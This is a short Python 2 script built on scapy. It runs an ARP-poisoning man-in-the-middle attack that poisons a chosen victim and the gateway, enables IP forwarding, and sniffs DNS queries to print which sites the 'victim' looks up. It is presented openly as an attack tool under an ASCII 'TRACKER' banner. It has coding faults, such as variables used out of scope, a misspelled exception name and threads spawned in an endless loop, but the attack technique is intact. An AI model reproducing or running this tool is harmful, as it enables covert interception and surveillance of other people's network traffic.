#!/usr/bin/python

from scapy.all import *
import threading
import os
import sys

img =  """\n
 _______ _____            _____ _  ________ _____  
 |__   __|  __ \     /\   / ____| |/ /  ____|  __ \ 
    | |  | |__) |   /  \ | |    | ' /| |__  | |__) |
    | |  |  _  /   / /\ \| |    |  < |  __| |  _  / 
    | |  | | \ \  / ____ \ |____| . \| |____| | \ \ 
    |_|  |_|  \_\/_/    \_\_____|_|\_\______|_|  \_\
                                                    

              *         *      *         *
          ***          **********          ***
       *****           **********           *****
     *******           **********           *******
   **********         ************         **********
  ****************************************************
 ******************************************************
********************************************************
********************************************************
********************************************************
 ******************************************************
  ********      ************************      ********
   *******       *     *********      *       *******
     ******             *******              ******
       *****             *****              *****
          ***             ***              ***
            **             *              **
\n"""


def dnshandle(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #Strip what information you need from the packet capture
      print 'Victim: ' + victim_ip + ' has searched for: ' + pkt.getlayer(DNS).qd.qname


def v_poison():

  v = ARP(pdst=victim_ip,psrc=defult_gate)
  while True:
    try:
      send(v,verbose=0,inter=1,loop=1)
    except KeyboardInterupt:
      sys.exit(1)
def gate_poison():

  gate = ARP(pdst=defult_gate,psrc=victim_ip)
  while True:
    try:
      send(gate,verbose=0,inter=1,loop=1)
    except KeyboardInterupt:
      sys.exit(1)
vthread = []
gthread = []


def arpfunc():
    print img
    victim_ip   = raw_input('\nPleas Enter the IP of victim: ')
    defult_gate = raw_input('\nPleas Enter The IP of the gateway: ')
    inter_face  = raw_input('\nPleas Enter the name of your interface: ')

    print 'Starting Poisning!....'

    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    while True :

      vpoison = threading.Thread(target=v_poison)
      vthread.append(vpoison)
      vpoison.start()

      gpoison = threading.Thread(target=gate_poison)
      gthread.append(gpoison)
      gpoison.start()

      pkt = sniff(iface=inter_face,filter='udp port 53', prn=dnshandle)
